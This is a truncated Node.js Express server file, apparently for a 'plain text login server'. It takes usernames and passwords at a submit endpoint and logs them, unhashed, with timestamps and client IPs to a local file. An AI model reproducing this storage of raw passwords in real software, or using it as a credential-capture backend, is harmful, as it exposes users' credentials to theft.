// server.js — plain text login server with debug viewer
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Main submissions file
const OUTFILE = path.join(__dirname, 'submissions.jsonl');

app.post('/submit', (req, res) => {
  const { username, password } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Missing username or password' });
  }

  const entry = { username, password, time: new Date().toISOString(), ip:
